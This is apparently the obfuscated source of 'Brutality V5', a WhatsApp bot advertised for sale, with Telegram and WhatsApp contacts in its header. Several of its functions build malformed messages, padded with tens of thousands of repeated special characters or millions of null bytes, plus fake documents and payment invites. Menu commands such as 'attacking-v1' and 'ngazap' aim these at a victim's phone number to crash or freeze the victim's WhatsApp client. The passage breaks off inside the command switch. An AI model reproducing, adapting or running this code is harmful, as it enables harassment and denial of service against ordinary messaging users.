/*

BUY SCRIPT BRUTALITY V5 VERSI NO ENCRYPT?
Telegram : t.me/dikabot_tech
WhatsApp : 6283841442290

SUMBER SCRIPT BY DIKA ID // REUPLOAD (SHARE) SERTAKAN SUMBER!!
https://whatsapp.com/channel/0029VaegLveBKfhz5g2mlg1d

*/
//===================================
require("./settings");
require('./lib/dekor');
require("./lib/virtex/virus");
const {
  WA_DEFAULT_EPHEMERAL,
  getAggregateVotesInPollMessage,
  generateWAMessageFromContent,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  areJidsSameUser,
  getContentType,
  useMultiFileAuthState,
  makeWASocket,
  fetchLatestBaileysVersion,
  makeCacheableSignalKeyStore,
  makeWaSocket
} = global.baileys1;
const fs = require('fs');
const util = require('util');
const chalk = require("chalk");
const moment = require('moment-timezone');
const {
  smsg,
  tanggal,
  getTime,
  isUrl,
  sleep,
  clockString,
  runtime,
  fetchJson,
  getBuffer,
  jsonformat,
  format,
  parseMention,
  getRandom,
  getGroupAdmins,
  generateProfilePicture
} = require("./lib/storage");
module.exports = dikabot = async (_0x4fb13b, _0x2decff, _0x292cf5, _0x2ac69b) => {
  try {
    var _0x357513 = _0x2decff.mtype === 'conversation' ? _0x2decff.message.conversation : _0x2decff.mtype == "imageMessage" ? _0x2decff.message.imageMessage.caption : _0x2decff.mtype == "videoMessage" ? _0x2decff.message.videoMessage.caption : _0x2decff.mtype == "extendedTextMessage" ? _0x2decff.message.extendedTextMessage.text : _0x2decff.mtype == "buttonsResponseMessage" ? _0x2decff.message.buttonsResponseMessage.selectedButtonId : _0x2decff.mtype == "listResponseMessage" ? _0x2decff.message.listResponseMessage.singleSelectReply.selectedRowId : _0x2decff.mtype == "templateButtonReplyMessage" ? _0x2decff.message.templateButtonReplyMessage.selectedId : _0x2decff.mtype === "messageContextInfo" ? _0x2decff.message.buttonsResponseMessage?.["selectedButtonId"] || _0x2decff.message.listResponseMessage?.["singleSelectReply"]["selectedRowId"] || _0x2decff.text : '';
    var _0x16843c = typeof _0x2decff.text == 'string' ? _0x2decff.text : '';
    var _0x23c579 = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(_0x357513) ? _0x357513.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0x0] : '' : global.prefa ?? global.prefix;
    const _0x330797 = JSON.parse(fs.readFileSync('./lib/database/owner.json'));
    const _0x1877a0 = JSON.parse(fs.readFileSync("./lib/database/premium.json"));
    const _0xce55e7 = _0x357513.startsWith(_0x23c579) ? _0x357513.slice(_0x23c579.length).trim().split(" ").shift().toLowerCase() : '';
    const _0x395806 = _0x357513.trim().split(/ +/).slice(0x1);
    const _0x1d749f = await _0x4fb13b.decodeJid(_0x4fb13b.user.id);
    const _0x3845b7 = [_0x1d749f, ..._0x330797].map(_0x46c8b3 => _0x46c8b3.replace(/[^0-9]/g, '') + "@s.whatsapp.net").includes(_0x2decff.sender);
    const _0x5a1564 = [_0x1d749f, ..._0x1877a0].map(_0x2153f0 => _0x2153f0.replace(/[^0-9]/g, '') + "@s.whatsapp.net").includes(_0x2decff.sender);
    const _0x16d390 = q = _0x395806.join(" ");
    const _0x12833a = _0x2decff.quoted ? _0x2decff.quoted : _0x2decff;
    const _0x50877c = mek.key.remoteJid;
    const {
      spawn: _0x2e1fb2,
      exec: _0x5a6992
    } = require('child_process');
    const _0x43fbd3 = _0x2decff.isGroup ? await _0x4fb13b.groupMetadata(_0x50877c)["catch"](_0x1a404f => {}) : '';
    const _0x1a2731 = _0x2decff.isGroup ? await _0x43fbd3.participants : '';
    const _0x53932d = _0x2decff.isGroup ? await getGroupAdmins(_0x1a2731) : '';
    const _0x372379 = _0x2decff.isGroup ? _0x53932d.includes(_0x1d749f) : false;
    const _0x4d729f = _0x2decff.isGroup ? _0x53932d.includes(_0x2decff.sender) : false;
    const _0x2a020d = _0x2decff.pushName || "No Name";
    const _0x36ac30 = moment(Date.now()).tz("Asia/Jakarta").locale('id').format("HH:mm:ss z");
    const _0x52b1bf = fs.readFileSync("./lib/thumb/dikabot.jpg");
    const _0x3afa40 = (_0x12833a.msg || _0x12833a).mimetype || '';
    const {
      startbot: _0x4e0ce8,
      stopjadibot: _0x5b8ee7
    } = require("./lib/start");
    if (!_0x4fb13b["public"]) {
      if (!_0x3845b7) {
        return;
      }
    }
    if (_0xce55e7) {
      console.log('');
      console.log(chalk.white(chalk.bgHex("#4a69bd").bold("🚀 WhatsApp messages! 🚀")));
      console.log(chalk.black(chalk.bgHex("#fdcb6e")("📅 DATE: " + _0x36ac30 + "\n💬 MESSAGE: " + _0xce55e7 + "\n🗣️ SENDERNAME: " + _0x2a020d + "\n👤 JIDS: " + _0x2decff.sender)));
    }
    let _0x1f2b4d = ["recording"];
    let _0x4d1323 = _0x1f2b4d[Math.floor(Math.random() * _0x1f2b4d.length)];
    if (_0x2decff.message) {
      _0x4fb13b.sendPresenceUpdate(_0x4d1323, _0x50877c);
    }
    _0x4fb13b.sendButton = async (_0x66356b, _0x369c0f, _0x2338f7, _0x3a12e9 = {}) => {
      let _0x45f2d6 = generateWAMessageFromContent(_0x66356b, {
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'body': {
                'text': _0x3a12e9 && _0x3a12e9.body ? _0x3a12e9.body : ''
              },
              'footer': {
                'text': _0x3a12e9 && _0x3a12e9.footer ? _0x3a12e9.footer : ''
              },
              'nativeFlowMessage': {
                'buttons': _0x369c0f,
                'messageParamsJson': ''
              }
            }
          }
        }
      }, {
        'quoted': _0x2338f7
      });
      await _0x4fb13b.sendPresenceUpdate("composing", _0x66356b);
      return _0x4fb13b.relayMessage(_0x66356b, _0x45f2d6.message, {
        'messageId': _0x45f2d6.key.id
      });
    };
    const _0x1db8d8 = {
      'key': {
        'participant': '0@s.whatsapp.net',
        ...(_0x2decff.chat ? {
          'remoteJid': "status@broadcast"
        } : {})
      },
      'message': {
        'interactiveMessage': {
          'header': {
            'hasMediaAttachment': true,
            'jpegThumbnail': _0x52b1bf
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'review_and_pay',
              'buttonParamsJson': "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"𝖡𝖱𝖴𝖳𝖠𝖫𝖨𝖳𝖸 𝖡𝖸 𝖣𝖨𝖪𝖠 𝖨𝖣\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
            }]
          }
        }
      }
    };
    const _0x1559ff = {
      'key': {
        'participant': "0@s.whatsapp.net",
        ...(_0x2decff.chat ? {
          'remoteJid': 'status@broadcast'
        } : {})
      },
      'message': {
        'listResponseMessage': {
          'title': "𝙳𝙸𝙺𝙰 𝚂𝚃𝚈𝙻𝙴"
        }
      }
    };
    async function _0x4dcd57(_0xd942b9, _0x43c9e9) {
      var _0x44f5fa = generateWAMessageFromContent(_0xd942b9, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'liveLocationMessage': {
              'degreesLatitude': 'p',
              'degreesLongitude': 'p',
              'caption': "𝙳𝙸𝙺𝙰 𝚂𝚃𝚈𝙻𝙴" + 'ꦾ'.repeat(0xea60),
              'sequenceNumber': '0',
              'jpegThumbnail': ''
            }
          }
        }
      }), {
        'userJid': _0xd942b9,
        'quoted': _0x43c9e9
      });
      await _0x4fb13b.relayMessage(_0xd942b9, _0x44f5fa.message, {
        'participant': {
          'jid': _0xd942b9
        },
        'messageId': _0x44f5fa.key.id
      });
    }
    async function _0x4279c5(_0x465338, _0x4d3d00) {
      var _0x23e2d5 = generateWAMessageFromContent(_0x465338, proto.Message.fromObject({
        'interactiveMessage': {
          'header': {
            'title': "𝙳𝙸𝙺𝙰 𝚂𝚃𝚈𝙻𝙴",
            'hasMediaAttachment': true,
            ...(await prepareWAMessageMedia({
              'image': {
                'url': 'https://i.postimg.cc/Q86pPcsn/dikabot.jpg'
              }
            }, {
              'upload': _0x4fb13b.waUploadToServer
            }))
          },
          'body': {
            'text': ''
          },
          'footer': {
            'text': "𝙳𝙸𝙺𝙰 𝚂𝚃𝚈𝙻𝙴"
          },
          'nativeFlowMessage': {
            'messageParamsJson': "\0".repeat(0x2dc6c0)
          }
        }
      }), {
        'userJid': _0x465338,
        'quoted': _0x4d3d00
      });
      await _0x4fb13b.relayMessage(_0x465338, _0x23e2d5.message, {
        'participant': {
          'jid': _0x465338
        },
        'messageId': _0x23e2d5.key.id
      });
    }
    async function _0x5cc5cf(_0xd2cc5a, _0x51ec0f) {
      var _0x408d2b = generateWAMessageFromContent(_0xd2cc5a, proto.Message.fromObject({
        'documentMessage': {
          'url': "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
          'mimetype': "penis",
          'fileSha256': 'ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=',
          'fileLength': "999999999",
          'pageCount': 0x3b9ac9ff,
          'mediaKey': "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
          'fileName': "𝖡𝖱𝖴𝖳𝖠𝖫𝖨𝖳𝖸 𝖡𝖸 𝖣𝖨𝖪𝖠 𝖨𝖣" + 'ྦྷ'.repeat(0xea60),
          'fileEncSha256': 'pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=',
          'directPath': '/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0',
          'mediaKeyTimestamp': '1715880173'
        }
      }), {
        'userJid': _0xd2cc5a,
        'quoted': _0x51ec0f
      });
      await _0x4fb13b.relayMessage(_0xd2cc5a, _0x408d2b.message, {
        'participant': {
          'jid': _0xd2cc5a
        },
        'messageId': _0x408d2b.key.id
      });
    }
    async function _0x2f63f7(_0x1f2b25, _0x5effaf) {
      var _0x53c9c2 = generateWAMessageFromContent(_0x1f2b25, proto.Message.fromObject({
        'stickerMessage': {
          'url': "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
          'fileSha256': 'CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=',
          'fileEncSha256': "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
          'mediaKey': "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
          'mimetype': "image/webp",
          'directPath': "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
          'fileLength': "10116",
          'mediaKeyTimestamp': "1715876003",
          'isAnimated': false,
          'stickerSentTs': "1715881084144",
          'isAvatar': false,
          'isAiSticker': false,
          'isLottie': false
        }
      }), {
        'userJid': _0x1f2b25,
        'quoted': _0x5effaf
      });
      await _0x4fb13b.relayMessage(_0x1f2b25, _0x53c9c2.message, {
        'participant': {
          'jid': _0x1f2b25
        },
        'messageId': _0x53c9c2.key.id
      });
    }
    async function _0x1a7d5e(_0x111010) {
      var _0x4588f9 = generateWAMessageFromContent(_0x111010, proto.Message.fromObject({
        'listMessage': {
          'title': "𝙳𝙸𝙺𝙰 𝚂𝚃𝚈𝙻𝙴" + "\0".repeat(0x2710),
          'footerText': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
          'description': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
          'buttonText': null,
          'listType': 0x2,
          'productListInfo': {
            'productSections': [{
              'title': "lol",
              'products': [{
                'productId': "4392524570816732"
              }]
            }],
            'productListHeaderImage': {
              'productId': '4392524570816732',
              'jpegThumbnail': null
            },
            'businessOwnerJid': "0@s.whatsapp.net"
          }
        },
        'footer': "lol",
        'contextInfo': {
          'expiration': 0x927c0,
          'ephemeralSettingTimestamp': "1679959486",
          'entryPointConversionSource': "global_search_new_chat",
          'entryPointConversionApp': 'whatsapp',
          'entryPointConversionDelaySeconds': 0x9,
          'disappearingMode': {
            'initiator': "INITIATED_BY_ME"
          }
        },
        'selectListType': 0x2,
        'product_header_info': {
          'product_header_info_id': 0x4433e2e130,
          'product_header_is_rejected': false
        }
      }), {
        'userJid': _0x111010
      });
      await _0x4fb13b.relayMessage(_0x111010, _0x4588f9.message, {
        'participant': {
          'jid': _0x111010
        },
        'messageId': _0x4588f9.key.id
      });
    }
    async function _0x8861df(_0x11da6f) {
      var _0x29ed3c = generateWAMessageFromContent(_0x11da6f, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'title': '',
                'subtitle': " "
              },
              'body': {
                'text': "𝙳𝙸𝙺𝙰 𝚂𝚃𝚈𝙻𝙴"
              },
              'footer': {
                'text': "dikaganteng"
              },
              'nativeFlowMessage': {
                'buttons': [{
                  'name': "cta_url",
                  'buttonParamsJson': "{ display_text : '𝙳𝙸𝙺𝙰 𝚂𝚃𝚈𝙻𝙴', url : , merchant_url :  }"
                }],
                'messageParamsJson': "\0".repeat(0x2dc6c0)
              }
            }
          }
        }
      }), {
        'userJid': _0x11da6f
      });
      await _0x4fb13b.relayMessage(_0x11da6f, _0x29ed3c.message, {
        'participant': {
          'jid': _0x11da6f
        },
        'messageId': _0x29ed3c.key.id
      });
    }
    async function _0x32d24f(_0x2f11f7) {
      _0x4fb13b.relayMessage(_0x2f11f7, {
        'extendedTextMessage': {
          'text': '.',
          'contextInfo': {
            'stanzaId': _0x2f11f7,
            'participant': _0x2f11f7,
            'quotedMessage': {
              'conversation': 'Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½' + "ê¦¾".repeat(0xea60)
            },
            'disappearingMode': {
              'initiator': "CHANGED_IN_CHAT",
              'trigger': "CHAT_SETTING"
            }
          },
          'inviteLinkGroupTypeV2': "DEFAULT"
        }
      }, {
        'participant': {
          'jid': _0x2f11f7
        }
      }, {
        'messageId': null
      });
    }
    const _0x9108e4 = {
      'key': {
        'remoteJid': 'status@broadcast',
        'fromMe': false,
        'participant': "0@s.whatsapp.net"
      },
      'message': {
        'listResponseMessage': {
          'title': "𝙳𝙸𝙺𝙰 𝚂𝚃𝚈𝙻𝙴"
        }
      }
    };
    async function _0x1f7c0d(_0x5e5e2e) {
      await _0x4fb13b.relayMessage(_0x5e5e2e, {
        'paymentInviteMessage': {
          'serviceType': "FBPAY",
          'expiryTimestamp': Date.now() + 0x6c258c00
        }
      }, {});
      sleep(0xc8);
      await _0x4fb13b.relayMessage(_0x5e5e2e, {
        'paymentInviteMessage': {
          'serviceType': "FBPAY",
          'expiryTimestamp': Date.now() + 0x6c258c00
        }
      }, {
        'participant': {
          'jid': _0x5e5e2e
        }
      });
      sleep(0xc8);
      await _0x4fb13b.relayMessage(_0x5e5e2e, {
        'paymentInviteMessage': {
          'serviceType': "FBPAY",
          'expiryTimestamp': Date.now() + 0x6c258c00
        }
      }, {});
    }
    async function _0x26a059(_0xc1ff00) {
      _0x1f7c0d(_0xc1ff00);
      sleep(0x1f4);
      _0x32d24f(_0xc1ff00);
    }
    let _0x5b2d35 = new Date(new Date() + 0x36ee80);
    const _0x527bc0 = _0x5b2d35.toLocaleDateString('id', {
      'day': "numeric",
      'month': "long",
      'year': 'numeric'
    });
    const _0x2ad877 = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    if (_0x2ad877 < "23:59:00") {
      var _0x466a49 = "Selamat Malam";
    }
    if (_0x2ad877 < "19:00:00") {
      var _0x466a49 = "Selamat Petang";
    }
    if (_0x2ad877 < "18:00:00") {
      var _0x466a49 = "Selamat Sore";
    }
    if (_0x2ad877 < "15:00:00") {
      var _0x466a49 = "Selamat Siang";
    }
    if (_0x2ad877 < "10:00:00") {
      var _0x466a49 = "Selamat Pagi";
    }
    if (_0x2ad877 < '05:00:00') {
      var _0x466a49 = "Selamat Subuh";
    }
    if (_0x2ad877 < "03:00:00") {
      var _0x466a49 = "Tengah Malam";
    }
    const _0x303a92 = _0x189641 => {
      _0x4fb13b.sendMessage(_0x50877c, {
        'text': _0x189641,
        'contextInfo': {
          'mentionedJid': [_0x2decff.sender],
          'externalAdReply': {
            'showAdAttribution': false,
            'renderLargerThumbnail': false,
            'title': "DIKA ID",
            'body': "Hai 👋 " + _0x2decff.pushName,
            'previewType': '1',
            'thumbnail': _0x52b1bf,
            'sourceUrl': "https://whatsapp.com/channel/0029VaegLveBKfhz5g2mlg1d",
            'mediaUrl': "https://whatsapp.com/channel/0029VaegLveBKfhz5g2mlg1d"
          }
        },
        'text': _0x189641
      }, {
        'quoted': _0x2decff
      });
    };
    switch (_0xce55e7) {
      case "menu":
        {
          _0x303a92("Hai 👋 *" + _0x2a020d + " " + _0x466a49 + "*\nSaya adalah *" + global.botname + "* version *" + global.versionsc + "* yang di rancang oleh *" + global.creatorbot + "* untuk membantu anda!\n\n" + global.ataskiri + " `LIST MENU BY DIKA ID` " + global.ataskanan + "\n" + global.samping + global.simbol + " " + _0x23c579 + "allmenu\n" + global.samping + global.simbol + " " + _0x23c579 + "bugmenu\n" + global.samping + global.simbol + " " + _0x23c579 + "aksesmenu\n" + global.samping + global.simbol + " " + _0x23c579 + "settingsmenu\n" + global.samping + global.simbol + " " + _0x23c579 + "error /failed\n" + global.samping + global.simbol + " " + _0x23c579 + "cekbot\n" + global.bawah + "\n\n`BRUTALITY VERSION 5`\n" + _0x527bc0 + " - " + _0x2ad877);
        }
        break;
      case "allmenu":
        {
          _0x303a92("Hai 👋 *" + _0x2a020d + " " + _0x466a49 + "*\nIni adalah tampilan " + _0xce55e7 + " *" + global.botname + "*\n\n" + global.ataskiri + " `BUG MENU BY DIKA ID` " + global.ataskanan + "\n" + global.samping + global.simbol + " " + _0x23c579 + "attacking-v1 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "attacking-v2 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "attacking-v3 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "attacking-v4 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "attacking-v5 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "external-v1 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "external-v2 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "external-v3 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "external-v4 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "external-v5 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "internal-v1 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "internal-v2 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "internal-v3 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "internal-v4 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "internal-v5 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "ngazap-v1 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "ngazap-v2 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "ngazap-v3 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "ngazap-v4 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "ngazap-v5 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "🌷 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "🌹 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "🥀 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "💐 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "🌼 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "🏵️ 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "🌺 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "🌻 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "🌸 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "🪷 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "😆 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "😂 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "🤓 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "🤪 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "😱 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "🌊 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "⚡ 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "🌀 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "🌪️ 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "💧 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "😺 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "😹 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "😻 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "😼 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "🙀 628xxx\n" + global.bawah + "\n\n" + global.ataskiri + " `AKSES MENU BY DIKA ID` " + global.ataskanan + "\n" + global.samping + global.simbol + " " + _0x23c579 + "addowner 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "delowner 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "addpremium 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "delpremium 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "blok 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "unblok 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "listowner\n" + global.samping + global.simbol + " " + _0x23c579 + "listpremium\n" + global.bawah + "\n\n" + global.ataskiri + " `SETTINGS MENU BY DIKA ID` " + global.ataskanan + "\n" + global.samping + global.simbol + " " + _0x23c579 + "self\n" + global.samping + global.simbol + " " + _0x23c579 + "public\n" + global.samping + global.simbol + " " + _0x23c579 + "setppbot\n" + global.samping + global.simbol + " " + _0x23c579 + "setppbot /full\n" + global.bawah + "\n\n`BRUTALITY VERSION 5`\n" + _0x527bc0 + " - " + _0x2ad877);
        }
        break;
      case "bugmenu":
      case "menubug":
        {
          _0x303a92(global.ataskiri + " `BUG MENU BY DIKA ID` " + global.ataskanan + "\n" + global.samping + global.simbol + " " + _0x23c579 + "bugcrash-v1\n" + global.samping + global.simbol + " " + _0x23c579 + "bugcrash-v2\n" + global.samping + global.simbol + " " + _0x23c579 + "bugcrash-v3\n" + global.samping + global.simbol + " " + _0x23c579 + "bugemoji-v1\n" + global.samping + global.simbol + " " + _0x23c579 + "bugemoji-v2\n" + global.samping + global.simbol + " " + _0x23c579 + "bugemoji-v3\n" + global.bawah + "\n\n`BRUTALITY VERSION 5`\n" + _0x527bc0 + " - " + _0x2ad877);
        }
        break;
      case "bugcrash-v1":
        {
          _0x303a92(global.ataskiri + " `BUG CRASH V1 BY DIKA ID` " + global.ataskanan + "\n" + global.samping + global.simbol + " " + _0x23c579 + "attacking-v1 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "attacking-v2 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "attacking-v3 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "attacking-v4 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "attacking-v5 628xxx\n" + global.bawah + "\n\n`BRUTALITY VERSION 5`\n" + _0x527bc0 + " - " + _0x2ad877);
        }
        break;
      case "bugcrash-v2":
        {
          _0x303a92(global.ataskiri + " `BUG CRASH V2 BY DIKA ID` " + global.ataskanan + "\n" + global.samping + global.simbol + " " + _0x23c579 + "external-v1 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "external-v2 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "external-v3 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "external-v4 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "external-v5 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "internal-v1 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "internal-v2 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "internal-v3 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "internal-v4 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "internal-v5 628xxx\n" + global.bawah + "\n\n`BRUTALITY VERSION 5`\n" + _0x527bc0 + " - " + _0x2ad877);
        }
        break;
      case "bugcrash-v3":
        {
          _0x303a92(global.ataskiri + " `BUG CRASH V3 BY DIKA ID` " + global.ataskanan + "\n" + global.samping + global.simbol + " " + _0x23c579 + "ngazap-v1 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "ngazap-v2 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "ngazap-v3 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "ngazap-v4 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "ngazap-v5 628xxx\n" + global.bawah + "\n\n`BRUTALITY VERSION 5`\n" + _0x527bc0 + " - " + _0x2ad877);
        }
        break;
      case "bugemoji-v1":
        {
          _0x303a92(global.ataskiri + " `BUG EMOJI V1 BY DIKA ID` " + global.ataskanan + "\n" + global.samping + global.simbol + " " + _0x23c579 + "🌷 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "🌹 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "🥀 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "💐 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "🌼 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "🏵️ 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "🌺 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "🌻 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "🌸 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "🪷 628xxx\n" + global.bawah + "\n\n`BRUTALITY VERSION 5`\n" + _0x527bc0 + " - " + _0x2ad877);
        }
        break;
      case "bugemoji-v2":
        {
          _0x303a92("`BUG EMOJI V2 BY DIKA ID`\n" + global.samping + global.simbol + " " + _0x23c579 + "😆 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "😂 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "🤓 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "🤪 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "😱 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "🌊 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "⚡ 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "🌀 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "🌪️ 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "💧 628xxx\n" + global.bawah + "\n\n`BRUTALITY VERSION 5`\n" + _0x527bc0 + " - " + _0x2ad877);
        }
        break;
      case "bugemoji-v3":
        {
          _0x303a92(global.ataskiri + " `BUG EMOJI V3 BY DIKA ID` " + global.ataskanan + "\n" + global.samping + global.simbol + " " + _0x23c579 + "😺 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "😹 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "😻 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "😼 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "🙀 628xxx\n" + global.bawah + "\n\n`BRUTALITY VERSION 5`\n" + _0x527bc0 + " - " + _0x2ad877);
        }
        break;
      case "aksesmenu":
      case "menuakses":
        {
          _0x303a92(global.ataskiri + " `AKSES MENU BY DIKA ID` " + global.ataskanan + "\n" + global.samping + global.simbol + " " + _0x23c579 + "addowner 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "delowner 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "addpremium 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "delpremium 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "blok 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "unblok 628xxx\n" + global.samping + global.simbol + " " + _0x23c579 + "listowner\n" + global.samping + global.simbol + " " + _0x23c579 + "listpremium\n" + global.bawah + "\n\n`BRUTALITY VERSION 5`\n" + _0x527bc0 + " - " + _0x2ad877);
        }
        break;
      case "settingsmenu":
      case "menusettings":
        {
